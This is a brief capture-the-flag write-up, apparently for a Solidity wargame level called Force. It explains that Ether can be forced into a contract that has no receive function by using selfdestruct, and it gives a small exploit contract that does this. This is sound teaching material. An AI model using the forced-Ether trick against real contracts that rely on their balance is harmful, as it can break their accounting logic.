### Analysis
Simple transfer or send won't work because the Force implements neither receive nor fallaback functions. Calls with any value will revert.
From the Solidity documentation:
A contract without a receive Ether function can receive Ether as a recipient of a coinbase transaction (aka miner block reward) or as a destination of a selfdestruct.A contract cannot react to such Ether transfers and thus also cannot reject them. This is a design choice of the EVM and Solidity cannot work around it.

### The Exploit
truffle script:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ForceWrapper{
    function selfDestruct(address payable transferAddress) external payable {
        selfdestruct(transferAddress);
    }
}
~~~